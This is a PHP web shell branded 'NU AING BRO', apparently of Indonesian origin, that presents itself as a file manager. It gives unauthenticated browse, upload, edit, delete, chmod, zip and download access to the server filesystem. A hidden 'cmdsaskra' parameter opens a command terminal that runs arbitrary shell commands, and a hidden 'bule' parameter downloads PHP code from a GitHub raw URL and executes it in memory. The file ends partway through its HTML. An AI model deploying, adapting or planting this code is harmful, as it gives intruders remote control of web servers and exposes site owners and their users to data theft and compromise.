<?php
@session_start();
ob_start();
ini_set('display_errors', 0);
error_reporting(E_ALL);

function msb($t){
    $map=['A'=>'𝗔','B'=>'𝗕','C'=>'𝗖','D'=>'𝗗','E'=>'𝗘','F'=>'𝗙','G'=>'𝗚','H'=>'𝗛','I'=>'𝗜','J'=>'𝗝','K'=>'𝗞','L'=>'𝗟','M'=>'𝗠','N'=>'𝗡','O'=>'𝗢','P'=>'𝗣','Q'=>'𝗤','R'=>'𝗥','S'=>'𝗦','T'=>'𝗧','U'=>'𝗨','V'=>'𝗩','W'=>'𝗪','X'=>'𝗫','Y'=>'𝗬','Z'=>'𝗭','a'=>'𝗮','b'=>'𝗯','c'=>'𝗰','d'=>'𝗱','e'=>'𝗲','f'=>'𝗳','g'=>'𝗴','h'=>'𝗵','i'=>'𝗶','j'=>'𝗷','k'=>'𝗸','l'=>'𝗹','m'=>'𝗺','n'=>'𝗻','o'=>'𝗼','p'=>'𝗽','q'=>'𝗾','r'=>'𝗿','s'=>'𝘀','t'=>'𝘁','u'=>'𝘂','v'=>'𝘃','w'=>'𝘄','x'=>'𝘅','y'=>'𝘆','z'=>'𝘇','0'=>'𝟬','1'=>'𝟭','2'=>'𝟮','3'=>'𝟯','4'=>'𝟰','5'=>'𝟱','6'=>'𝟲','7'=>'𝟳','8'=>'𝟴','9'=>'𝟵'];
    $r='';for($i=0;$i<strlen($t);$i++){$x=$t[$i];$r.=isset($map[$x])?$map[$x]:$x;}return $r;
}

$session_timeout = 1800;
$pageSize        = 20;
// LOGIN CONFIG
$login_enabled = false; // Set to false to disable login
$login_password_hash = '$2y$12$.cJH9V.GjY1UXoi5nouH8uj.YsZqGKWpIk3.ZTplFXUvk798CCuhy'; // default: admin123

// AUTH CHECK
$login_error = '';
if ($login_enabled) {
    if (isset($_GET['logout'])) {
        @session_destroy();
        header("Location: ?");
        exit;
    }
    if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_login']) && isset($_POST['fm_pass'])) {
            if (password_verify($_POST['fm_pass'], $login_password_hash)) {
                $_SESSION['fm_auth'] = false;
                header("Location: ?");
                exit;
            } else {
                $login_error = "Invalid password!";
            }
        }
        ?>
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="UTF-8">
        <title><?php echo msb('Login'); ?></title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <style>
        body { margin:0; padding:0; background:#f5f5f5; color:#222; font-family:'Inter',sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
        .login-box { background:#fff; padding:40px; border:1px solid #ccc; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1); width:320px; text-align:center; }
        .login-box h2 { margin:0 0 20px 0; font-size:1.5em; color:#222; }
        .login-box input[type=password] { width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; margin-bottom:15px; font-size:1em; box-sizing:border-box; outline:none; transition:border .2s; }
        .login-box input[type=password]:focus { border-color:#0066cc; }
        .login-box input[type=submit] { width:100%; padding:12px; background:#222; color:#fff; border:none; border-radius:4px; font-weight:600; cursor:pointer; font-size:1em; transition:background .2s; }
        .login-box input[type=submit]:hover { background:#444; }
        .login-box .error { color:#cc2222; margin-bottom:15px; font-size:0.9em; }
        </style>
        </head>
        <body>
        <div class="login-box">
            <h2><?php echo msb('NU AING BRO'); ?></h2>
            <?php if($login_error){ ?><div class="error"><?php echo htmlspecialchars($login_error); ?></div><?php } ?>
            <form method="post">
                <input type="password" name="fm_pass" placeholder="Password" autofocus>
                <input type="submit" name="fm_login" value="<?php echo msb('Login'); ?>">
            </form>
        </div>
        </body>
        </html>
        <?php
        exit;
    }
}


if (isset($_GET['bule'])) {
    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/23bin";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error    = curl_error($ch);

    curl_close($ch);
    if ($response !== false && $httpCode === 200) {
        try {
            if (!stream_wrapper_register("memoryinclude", "MemoryInclude")) {
                throw new Exception("Gagal mendaftarkan stream wrapper");
            }
            MemoryInclude::$data = $response;
            include "memoryinclude://jpg";
            stream_wrapper_unregister("memoryinclude");
        } catch (Exception $e) {
            echo "Error: " . $e->getMessage();
        }
    } else {
        echo "Gagal mengambil file. Kode HTTP: $httpCode, Error: $error";
    }
}

class MemoryInclude {
    public static $data = '';   
    private $position   = 0;
    private $length     = 0;

    public function stream_open($path, $mode, $options, &$opened_path) {
        $this->position = 0;
        $this->length   = strlen(self::$data);
        return true;
    }
    public function stream_read($count) {
        $ret = substr(self::$data, $this->position, $count);
        $this->position += strlen($ret);
        return $ret;
    }

    public function stream_eof() {
        return $this->position >= $this->length;
    }
    public function stream_stat() {
        return [
            'size' => $this->length,
        ];
    }
}

$isWindows   = (DIRECTORY_SEPARATOR === '\\');
$rootAllowed = $isWindows ? '' : '/';

$basePath = dirname(__FILE__);
if(isset($_REQUEST['path'])){
    $temp = @realpath($_REQUEST['path']);
    if($temp && @is_dir($temp)){
        $basePath = $temp;
    }
}

function ts($d) {
    return rtrim($d, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
}
function ds($p) {
    return is_dir($p);
}
function fm($b) {
    return $b ? scandir($b) : array();
}
function del($t){
    if(is_dir($t)){
        $x = scandir($t);
        foreach($x as $y){
            if($y==='.'||$y==='..') continue;
            del($t.DIRECTORY_SEPARATOR.$y);
        }
        @rmdir($t);
    } else {
        @unlink($t);
    }
}
function fs($s){
    if($s<1024) return $s.' B';
    if($s<1048576) return round($s/1024,2).' KB';
    if($s<1073741824) return round($s/1048576,2).' MB';
    return round($s/1073741824,2).' GB';
}
function getPermOctal($path){
    $perm=@fileperms($path);
    if($perm===false) return '????';
    $mode=$perm & 0x0FFF;
    return sprintf("%04o", $mode);
}
function octalToSymbolic($octal){
    $val  = octdec($octal);
    $slot = array("r","w","x","r","w","x","r","w","x");
    $res  = "";
    for($i=0;$i<9;$i++){
        $mask=1<<(8-$i);
        $res.=($val & $mask)?$slot[$i]:"-";
    }
    return $res;
}
function getModified($path){
    $t=@filemtime($path);
    if(!$t) return '-';
    return date("Y-m-d H:i:s",$t);
}
function getFileIcon($name,$isDir){
    if($isDir) return '<span style="color:#0f8;">[DIR]</span>';
    $ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
    switch($ext){
        case 'jpg': case 'jpeg': case 'png': case 'gif': return '🖼';
        case 'zip': case 'rar': case '7z': return '📦';
        case 'mp3': case 'wav': case 'ogg':return '🎵';
        case 'mp4': case 'mov': case 'avi':return '🎞';
        case 'pdf': return '📄';
        default:     return '📄';
    }
}

if(isset($_POST['action'])){
    switch($_POST['action']){
        case 'upload':
            if(!empty($_FILES['upload_files']['name'][0])){
                foreach($_FILES['upload_files']['name'] as $i=>$n){
                    $tmp=$_FILES['upload_files']['tmp_name'][$i];
                    if($tmp){
                        @move_uploaded_file($tmp, ts($basePath).$n);
                    }
                }
            }
            break;

        case 'mkdir':
            $f=trim($_POST['folder_name']);
            if($f){
                @mkdir(ts($basePath).$f);
            }
            break;

        case 'create_file':
            $f=trim($_POST['filename']);
            $c=$_POST['filecontent'];
            if($f){
                @file_put_contents(ts($basePath).$f,$c);
            }
            break;

        case 'rename':
            $o=$_POST['old_name'];
            $n=$_POST['new_name'];
            if($o && $n){
                $oldFull=@realpath(ts($basePath).$o);
                $newFull=ts($basePath).$n;
                if($oldFull && strpos($oldFull,$rootAllowed)===0){
                    @rename($oldFull,$newFull);
                }
            }
            break;

        case 'delete':
            $t=$_POST['target'];
            if($t){
                $targetFull=@realpath(ts($basePath).$t);
                if($targetFull && strpos($targetFull,$rootAllowed)===0){
                    del($targetFull);
                }
            }
            break;

        case 'edit_file_save':
            $e=$_POST['edit_target'];
            $c=$_POST['new_content'];
            $r=@realpath($e);
            if($r && is_file($r) && strpos($r,$rootAllowed)===0){
                @file_put_contents($r,$c);
            }
            break;

        case 'chmod':
            $t=$_POST['target'];
            $perm=$_POST['perm'];
            if($t!=='' && $perm!==''){
                $targetFull=@realpath(ts($basePath).$t);
                if($targetFull && strpos($targetFull,$rootAllowed)===0){
                    @chmod($targetFull, octdec($perm));
                }
            }
            break;

        case 'zip':
            if(!class_exists('ZipArchive')){
                $_SESSION['fm_flash']='ZipArchive extension not available!';
                break;
            }
            if(!empty($_POST['zip_items']) && is_array($_POST['zip_items'])){
                $zipName=ts($basePath).'archive_'.date('Ymd_His').'.zip';
                $zip=new ZipArchive();
                if($zip->open($zipName, ZipArchive::CREATE|ZipArchive::OVERWRITE)===true){
                    foreach($_POST['zip_items'] as $item){
                        $itemPath=ts($basePath).$item;
                        $realPath=@realpath($itemPath);
                        if($realPath && strpos($realPath,$rootAllowed)===0){
                            if(is_dir($realPath)){
                                $zip->addEmptyDir($item);
                                $iterator=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($realPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                                foreach($iterator as $file){
                                    $relPath=$item.'/'.substr($file->getPathname(), strlen($realPath)+1);
                                    if($file->isDir()){
                                        $zip->addEmptyDir($relPath);
                                    } else {
                                        $zip->addFile($file->getPathname(), $relPath);
                                    }
                                }
                            } elseif(is_file($realPath)){
                                $zip->addFile($realPath, $item);
                            }
                        }
                    }
                    $zip->close();
                    $_SESSION['fm_flash']='ZIP created: '.basename($zipName);
                } else {
                    $_SESSION['fm_flash']='Failed to create ZIP!';
                }
            } else {
                $_SESSION['fm_flash']='No items selected!';
            }
            break;
    }
    header("Location: ?path=".urlencode($basePath));
    exit;
}

// DOWNLOAD
if(isset($_GET['download'])){
    $f=@realpath($_GET['download']);
    if($f && is_file($f) && strpos($f,$rootAllowed)===0){
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.@filesize($f));
        @readfile($f);
        exit;
    }
}

// EDIT FILE
$edit_file_mode=false;
$edit_file_path='';
$edit_file_content='';
$aceMode='ace/mode/text';

if(isset($_GET['edit'])){
    $et=@realpath($_GET['edit']);
    if($et && is_file($et) && strpos($et,$rootAllowed)===0){
        $edit_file_mode=true;
        $edit_file_path=$et;
        $edit_file_content=@file_get_contents($et);
        $ext=strtolower(pathinfo($et,PATHINFO_EXTENSION));
        switch($ext){
            case 'php':  $aceMode='ace/mode/php';break;
            case 'js':   $aceMode='ace/mode/javascript';break;
            case 'css':  $aceMode='ace/mode/css';break;
            case 'html': $aceMode='ace/mode/html';break;
            case 'htm':  $aceMode='ace/mode/html';break;
            case 'json': $aceMode='ace/mode/json';break;
            case 'xml':  $aceMode='ace/mode/xml';break;
            default:     $aceMode='ace/mode/text';break;
        }
    }
}

// VIEW FILE
$view_file_mode=false;
$view_file_path='';
$view_file_content='';
$view_aceMode='ace/mode/text';
$view_isMedia=false;
$view_mediaTag='';

if(isset($_GET['view'])){
    $vt=@realpath($_GET['view']);
    if($vt && is_file($vt) && strpos($vt,$rootAllowed)===0){
        $view_file_mode=true;
        $view_file_path=$vt;
        $vext=strtolower(pathinfo($vt,PATHINFO_EXTENSION));
        switch($vext){
            case 'php':  $view_aceMode='ace/mode/php';break;
            case 'js':   $view_aceMode='ace/mode/javascript';break;
            case 'css':  $view_aceMode='ace/mode/css';break;
            case 'html': $view_aceMode='ace/mode/html';break;
            case 'htm':  $view_aceMode='ace/mode/html';break;
            case 'json': $view_aceMode='ace/mode/json';break;
            case 'xml':  $view_aceMode='ace/mode/xml';break;
            default:     $view_aceMode='ace/mode/text';break;
        }
        $imgExts=array('jpg','jpeg','png','gif','bmp','webp','svg');
        $vidExts=array('mp4','webm','mov','avi','mkv');
        $audExts=array('mp3','wav','ogg','flac');
        if(in_array($vext,$imgExts)){
            $view_isMedia=true;
            $view_mediaTag='<img src="?download='.urlencode($vt).'" style="max-width:100%;max-height:70vh;display:block;margin:auto;border:1px solid #ccc;">';
        } elseif(in_array($vext,$vidExts)){
            $view_isMedia=true;
            $view_mediaTag='<video src="?download='.urlencode($vt).'" controls style="max-width:100%;max-height:70vh;display:block;margin:auto;border:1px solid #ccc;"></video>';
        } elseif(in_array($vext,$audExts)){
            $view_isMedia=true;
            $view_mediaTag='<audio src="?download='.urlencode($vt).'" controls style="display:block;margin:20px auto;"></audio>';
        } else {
            $view_file_content=@file_get_contents($vt);
        }
    }
}

// TERMINAL
$terminal_mode=false;
$terminal_output='';
$terminal_cmd='';
if(isset($_REQUEST['cmdsaskra'])){
    $terminal_mode=true;
    if(isset($_POST['terminal_cmd'])){
        $terminal_cmd=$_POST['terminal_cmd'];
        $cwd=$basePath;
        if(function_exists('shell_exec')){
            $descriptors=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
            $process=@proc_open($terminal_cmd,$descriptors,$pipes,$cwd);
            if(is_resource($process)){
                fclose($pipes[0]);
                $stdout=stream_get_contents($pipes[1]);
                $stderr=stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                $terminal_output=$stdout.($stderr?"
[STDERR]
".$stderr:'');
            } else {
                $terminal_output="Failed to execute command.";
            }
        } else {
            $terminal_output="shell_exec disabled.";
        }
    }
}

// FILTERING & SORT
$allFiles=fm($basePath);
$query=isset($_GET['q'])?trim($_GET['q']):'';
$filtered=array();
foreach($allFiles as $f){
    if($f==='.'||$f==='..') continue;
    if($query===''){
        $filtered[]=$f;
    } else {
        if(stripos($f,$query)!==false){
            $filtered[]=$f;
        }
    }
}
$sort=isset($_GET['sort'])?$_GET['sort']:'name';
function cmpName($a,$b){return strcasecmp($a,$b);}
function cmpSize($a,$b){
    global $basePath;
    $fa=ts($basePath).$a; 
    $fb=ts($basePath).$b;
    $sa=@is_file($fa)?@filesize($fa):0;
    $sb=@is_file($fb)?@filesize($fb):0;
    return $sa-$sb;
}
function cmpTime($a,$b){
    global $basePath;
    $fa=ts($basePath).$a;
    $fb=ts($basePath).$b;
    $ta=@filemtime($fa);
    $tb=@filemtime($fb);
    return $ta-$tb;
}
switch($sort){
    case 'size':usort($filtered,'cmpSize');break;
    case 'time':usort($filtered,'cmpTime');break;
    default:    usort($filtered,'cmpName');
}
$totalItems = count($filtered);
$totalPages = max(1,ceil($totalItems/$pageSize));
$currentPage= isset($_GET['page'])?(int)$_GET['page']:1;
if($currentPage<1)          $currentPage=1;
if($currentPage>$totalPages)$currentPage=$totalPages;
$startIndex=($currentPage-1)*$pageSize;
$pagedFiles=array_slice($filtered,$startIndex,$pageSize);

// Breadcrumb
$realBase=@realpath($basePath);
if(!$realBase) $realBase=$rootAllowed;

$breadcrumbList=array();
// IP INFO
if(function_exists('shell_exec')){
    $server_ip=@trim(@shell_exec('hostname -I'));
} else {
    $server_ip=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'127.0.0.1';
}
$your_ip=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'0.0.0.0';
if($isWindows){
    $parts=@preg_split('@[\\\\/]+@',$realBase);
    $tmpPath='';
    if(isset($parts[0]) && strpos($parts[0],':')!==false){
        $tmpPath=$parts[0];
        $breadcrumbList[]=array('name'=>$parts[0],'path'=>$tmpPath);
        array_shift($parts);
    }
    foreach($parts as $seg){
        if($seg==='') continue;
        if($tmpPath===''){
            $tmpPath=$seg;
        }else{
            $tmpPath=rtrim($tmpPath,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$seg;
        }
        $breadcrumbList[]=array('name'=>$seg,'path'=>$tmpPath);
    }
} else {
    $breadcrumbList[]=array('name'=>'/','path'=>'/');
    $trimmed=ltrim($realBase,'/');
    $parts=explode('/',$trimmed);
    $accum='';
    foreach($parts as $seg){
        if($seg==='') continue;
        $accum.='/'.$seg;
        $breadcrumbList[]=array('name'=>$seg,'path'=>$accum);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title><?php echo msb('NU AING BRO'); ?></title>
<!-- Font Futuristik -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
body{margin:0;padding:0;background:#f5f5f5;color:#222;font-family:'Inter',sans-serif;overflow-x:hidden}
header{background:#fff;padding:15px 20px;border-bottom:1px solid #ccc;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 4px rgba(0,0,0,0.05)}
header h1{margin:0;font-size:1.3em;color:#222;text-transform:uppercase;letter-spacing:1px}
.logout a{color:#333;text-decoration:none;border:1px solid #999;padding:6px 12px;border-radius:4px;transition:background .2s ease,color .2s ease}
.logout a:hover{background:#222;color:#fff}
.container{padding:20px}.ip-info{background:#fff;padding:8px 12px;border:1px solid #ccc;border-radius:4px;margin-bottom:12px;font-size:.85em;color:#666;display:flex;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
.breadcrumbs{background:#fff;padding:8px;border:1px solid #ccc;border-radius:4px;margin-bottom:15px;overflow:auto;font-size:.95em}
.breadcrumbs a{text-decoration:none;color:#0066cc;margin-right:5px;transition:color .2s}
.breadcrumbs a:hover{color:#003366;text-decoration:underline}
.breadcrumbs .sep{color:#666;margin-right:5px}
.search-box{margin-bottom:15px;display:flex;align-items:center}
.search-box input[type=text]{width:240px;padding:8px;border:1px solid #ccc;background:#fff;color:#222;border-radius:4px;outline:none;transition:border .2s,box-shadow .2s}
.search-box input[type=text]:focus{border-color:#0066cc;box-shadow:0 0 4px rgba(0,102,204,0.2)}
.search-box input[type=submit]{background:#222;color:#fff;border:none;padding:8px 16px;cursor:pointer;border-radius:4px;font-weight:600;margin-left:6px;transition:background .2s ease}
.search-box input[type=submit]:hover{background:#444}
.menu-bar{margin-bottom:15px}
.menu-bar button{background:#fff;color:#222;padding:10px 16px;margin-right:8px;border:1px solid #ccc;border-radius:4px;font-weight:600;cursor:pointer;transition:background .2s ease,box-shadow .2s,color .2s}
.menu-bar button:hover{background:#222;color:#fff;box-shadow:0 2px 6px rgba(0,0,0,0.1)}
.table-wrap{overflow:auto;background:#fff;border:1px solid #ccc;border-radius:4px;padding:10px;box-shadow:0 2px 6px rgba(0,0,0,0.05)}
table{width:100%;border-collapse:collapse;font-size:.95em;min-width:800px}
table th,table td{border-bottom:1px solid #ddd;padding:8px;vertical-align:middle}
table th{color:#222;text-align:left;background:#f0f0f0;font-weight:600}
table td{color:#333}
table a{color:#0066cc;text-decoration:none;transition:color .2s}
table a:hover{color:#003366;text-decoration:underline}
table td:nth-child(1),table th:nth-child(1){width:3%;text-align:center}table td:nth-child(2),table th:nth-child(2){width:3%;text-align:center}table td:nth-child(3),table th:nth-child(3){width:3%;text-align:center}
table th:last-child,table td:last-child{min-width:260px;text-align:right;white-space:nowrap}
.btn{display:inline-block;padding:4px 8px;background:#fff;color:#222;border:1px solid #ccc;border-radius:4px;font-size:.75rem;cursor:pointer;text-decoration:none;margin-left:3px;margin-bottom:3px;transition:background .2s,box-shadow .2s,color .2s}
.btn:hover{background:#222;color:#fff;box-shadow:0 2px 6px rgba(0,0,0,0.1)}
.download{color:#0066cc;border-color:#99ccee}
.edit{color:#228844;border-color:#88ccaa}
.del{color:#cc2222;border-color:#ee9999}
.view{color:#cc8800;border-color:#eedd99}
.file-preview img{max-width:80px;max-height:80px;margin:5px;border:1px solid #ddd}
.file-preview video,.file-preview audio{max-width:180px;margin:5px}
.paging{text-align:center;margin:10px 0}
.paging a{display:inline-block;padding:6px 10px;margin:2px;background:#fff;color:#222;border:1px solid #ccc;border-radius:4px;text-decoration:none;transition:background .2s,box-shadow .2s,color .2s}
.paging a:hover{background:#222;color:#fff;box-shadow:0 2px 6px rgba(0,0,0,0.1)}
.paging .current{background:#222;color:#fff;font-weight:600;box-shadow:0 2px 6px rgba(0,0,0,0.15)}
.tab-content{display:none;background:#fff;border:1px solid #ccc;border-radius:4px;padding:15px;margin-bottom:20px;box-shadow:0 2px 6px rgba(0,0,0,0.05)}
.form-group{margin-bottom:12px}
.form-group label{display:block;font-weight:600;margin-bottom:6px;color:#222}
.form-group input[type=text],.form-group textarea,.form-group input[type=file]{width:100%;background:#fff;border:1px solid #ccc;color:#222;border-radius:4px;padding:8px;outline:none;transition:border .2s,box-shadow .2s}
.form-group input[type=text]:focus,.form-group textarea:focus{border-color:#0066cc;box-shadow:0 0 4px rgba(0,102,204,0.2)}
.form-group input[type=submit]{background:#222;color:#fff;border:none;padding:8px 16px;cursor:pointer;border-radius:4px;font-weight:600;transition:background .2s ease}
.form-group input[type=submit]:hover{background:#444}
.drag-area{border:2px dashed #ccc;border-radius:6px;padding:20px;text-align:center;color:#666;margin-bottom:10px;transition:background .2s ease,color .2s ease,box-shadow .2s}
.drag-area.hover{background:#f0f6ff;color:#0066cc;box-shadow:0 0 4px rgba(0,102,204,0.1)}
#overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.4);z-index:998}
#renameBox,#chmodBox{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:20px 25px;border:1px solid #ccc;border-radius:6px;z-index:999;min-width:280px;box-shadow:0 6px 20px rgba(0,0,0,0.15)}
#renameBox h3,#chmodBox h3{margin-top:0;font-size:1.1em;color:#222}
#renameBox input[type=text],#chmodBox input[type=text]{width:100%;padding:8px;border:1px solid #ccc;border-radius:4px;margin-bottom:10px;background:#fff;color:#222}
#renameBox input[type=submit],#chmodBox input[type=submit]{background:#222;color:#fff;border:none;padding:8px 16px;cursor:pointer;border-radius:4px;font-weight:600}
#renameBox button,#chmodBox button{background:#fff;color:#222;border:1px solid #ccc;padding:8px 16px;cursor:pointer;border-radius:4px;font-weight:600}
.footer{text-align:center;margin:30px 0 15px 0;color:#666;font-size:.85em}
.footer span{color:#222}
</style>
<!-- ACE Editor -->
<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.23.1/src-min-noconflict/ace.js"></script>
</head>
<body>

<header>
  <h1><?php echo msb('NU AING BRO'); ?></h1>
  <div class="logout"><a href="?logout=true">Logout</a></div>
</header>

<div class="container">

  <!-- IP Info -->
  <div class="ip-info">
    <div><strong>Server IP</strong>: <?php echo htmlspecialchars($server_ip); ?></div>
    <div><strong>Your IP</strong>: <?php echo htmlspecialchars($your_ip); ?></div>
  </div>

  <div class="breadcrumbs">
    <?php
    $count = count($breadcrumbList);
    for($i=0;$i<$count;$i++){
      $b=$breadcrumbList[$i];
      $isLast=($i===$count-1);
      echo '<a href="?path=', urlencode($b['path']), '">', htmlspecialchars($b['name']), '</a>';
      if(!$isLast) echo '<span class="sep">/</span>';
    }
    ?>
  </div>

  <!-- Flash Message -->
  <?php if(!empty($_SESSION['fm_flash'])){ ?>
  <div style="background:#fff3cd;border:1px solid #ffc107;color:#856404;padding:10px 12px;border-radius:4px;margin-bottom:12px;font-size:0.9em;">
    <?php echo htmlspecialchars($_SESSION['fm_flash']); unset($_SESSION['fm_flash']); ?>
  </div>
  <?php } ?>

  <!-- Search -->
  <div class="search-box">
    <form method="get">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="text" name="q" placeholder="<?php echo msb('Search...'); ?>" value="<?php echo htmlspecialchars($query);?>">
      <input type="submit" value="<?php echo msb('Go'); ?>">
    </form>
  </div>

  <!-- Editor Mode: Tampilkan langsung (style="display:block;") jika $edit_file_mode -->
  <?php if($edit_file_mode){ ?>
  <div style="margin-bottom:20px; display:block;" id="editFileTab">
    <h3 style="color:#222;margin-top:0;"><?php echo msb('Edit File'); ?></h3>
    <div style="font-size:0.9em;margin-bottom:8px;">
      <?php echo htmlspecialchars($edit_file_path);?>
    </div>
    <form method="post" onsubmit="syncEditor()">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="edit_file_save">
      <input type="hidden" name="edit_target" value="<?php echo htmlspecialchars($edit_file_path);?>">
      <textarea id="editorContent" name="new_content" style="display:none;"><?php echo htmlspecialchars($edit_file_content);?></textarea>
      <div id="aceEditor" style="width:100%; height:400px; background:#1e242c;color:#eee;"></div>
      <input type="submit" value="<?php echo msb('Save'); ?>" style="margin-top:10px;">
      <a href="?path=<?php echo urlencode($basePath);?>" class="btn" style="margin-left:10px;"><?php echo msb('Cancel'); ?></a>
    </form>
  </div>
  <script>
  var aceEditor = ace.edit("aceEditor");
  aceEditor.setTheme("ace/theme/one_dark");
  aceEditor.session.setMode("<?php echo $aceMode;?>");
  aceEditor.setValue(document.getElementById("editorContent").value, -1);
  function syncEditor(){
    document.getElementById("editorContent").value = aceEditor.getValue();
  }
  </script>
  <?php } ?>

  <!-- VIEW FILE -->
  <?php if($view_file_mode){ ?>
  <div style="margin-bottom:20px; display:block;" id="viewFileTab">
    <h3 style="color:#222;margin-top:0;"><?php echo msb('View File'); ?></h3>
    <div style="font-size:0.9em;margin-bottom:8px;">
      <?php echo htmlspecialchars($view_file_path);?>
    </div>
    <?php if($view_isMedia){ ?>
      <div style="background:#fff;padding:20px;border-radius:6px;border:1px solid #ccc;box-shadow:0 2px 6px rgba(0,0,0,0.05);">
        <?php echo $view_mediaTag; ?>
      </div>
    <?php } else { ?>
      <div id="viewAceEditor" style="width:100%; height:400px; background:#1e242c;color:#eee;"></div>
    <?php } ?>
    <a href="?path=<?php echo urlencode($basePath);?>" class="btn" style="margin-top:10px;"><?php echo msb('Close'); ?></a>
  </div>
  <?php if(!$view_isMedia){ ?>
  <script>
  var viewAce = ace.edit("viewAceEditor");
  viewAce.setTheme("ace/theme/one_dark");
  viewAce.session.setMode("<?php echo $view_aceMode;?>");
  viewAce.setValue(<?php echo json_encode($view_file_content); ?>, -1);
  viewAce.setReadOnly(true);
  </script>
  <?php } ?>
  <?php } ?>

  <!-- TERMINAL -->
  <?php if($terminal_mode){ ?>
  <div style="margin-bottom:20px; display:block;" id="terminalTab">
    <h3 style="color:#222;margin-top:0;"><?php echo msb('Terminal'); ?></h3>
    <div style="font-size:0.85em;color:#666;margin-bottom:8px;">
      CWD: <?php echo htmlspecialchars($basePath); ?>
    </div>
    <form method="post" style="margin-bottom:10px;">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="cmdsaskra" value="1">
      <input type="text" name="terminal_cmd" value="<?php echo htmlspecialchars($terminal_cmd); ?>" placeholder="Enter command..." style="width:70%;padding:8px;border:1px solid #ccc;border-radius:4px;font-family:monospace;">
      <input type="submit" value="<?php echo msb('Execute'); ?>" style="padding:8px 16px;background:#222;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600;">
    </form>
    <?php if($terminal_output!==''){ ?>
    <pre style="background:#1e1e1e;color:#eee;padding:15px;border-radius:6px;overflow:auto;max-height:400px;border:1px solid #444;font-size:0.85em;line-height:1.4;"><?php echo htmlspecialchars($terminal_output); ?></pre>
    <?php } ?>
    <a href="?path=<?php echo urlencode($basePath);?>" class="btn" style="margin-top:10px;"><?php echo msb('Close'); ?></a>
  </div>
  <?php } ?>

  <!-- Menu Bar -->
  <div class="menu-bar">
    <button onclick="window.location='?'"><?php echo msb('Home'); ?></button>
    <button onclick="showTab('upload')"><?php echo msb('Upload'); ?></button>
    <button onclick="showTab('folder')"><?php echo msb('New Folder'); ?></button>
    <button onclick="showTab('file')"><?php echo msb('New File'); ?></button>
    <button onclick="goTerminal()"><?php echo msb('Terminal'); ?></button>
    <button onclick="document.getElementById('zipForm').submit();"><?php echo msb('Create ZIP'); ?></button>
    <script>
      function goTerminal(){
        let url = new URL(window.location.href);
        url.searchParams.set('cmdsaskra','1');
        window.location.href = url.toString();
      }
    </script>
  </div>

  <!-- TAB UPLOAD -->
  <div id="uploadTab" class="tab-content" style="display:none;">
    <h3 style="color:#222;margin-top:0;"><?php echo msb('Upload File'); ?></h3>
    <div id="dragArea" class="drag-area">
      <p>Drag & Drop file di sini</p>
      <p>atau pilih manual di bawah</p>
    </div>
    <form id="uploadForm" method="post" enctype="multipart/form-data" class="form-group">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="upload">
      <label><?php echo msb('Pilih file:'); ?></label>
      <input type="file" name="upload_files[]" multiple>
      <input type="submit" value="<?php echo msb('Upload'); ?>">
    </form>
  </div>

  <!-- TAB FOLDER -->
  <div id="folderTab" class="tab-content" style="display:none;">
    <h3 style="color:#222;margin-top:0;"><?php echo msb('Create Folder'); ?></h3>
    <form method="post">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="mkdir">
      <div class="form-group">
        <label><?php echo msb('Folder Name'); ?></label>
        <input type="text" name="folder_name" placeholder="Contoh: images">
      </div>
      <div class="form-group">
        <input type="submit" value="<?php echo msb('Create'); ?>">
      </div>
    </form>
  </div>

  <!-- TAB FILE -->
  <div id="fileTab" class="tab-content" style="display:none;">
    <h3 style="color:#222;margin-top:0;"><?php echo msb('Create File'); ?></h3>
    <form method="post">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="create_file">
      <div class="form-group">
        <label><?php echo msb('Filename'); ?></label>
        <input type="text" name="filename" placeholder="Contoh: index.php">
      </div>
      <div class="form-group">
        <label><?php echo msb('Content (optional)'); ?></label>
        <textarea name="filecontent" rows="4" placeholder="Boleh dikosongkan..."></textarea>
      </div>
      <div class="form-group">
        <input type="submit" value="Create">
      </div>
    </form>
  </div>

  <!-- RENAME & CHMOD BOX -->
  <div id="overlay"></div>
  <div id="renameBox">
    <h3><?php echo msb('Rename'); ?></h3>
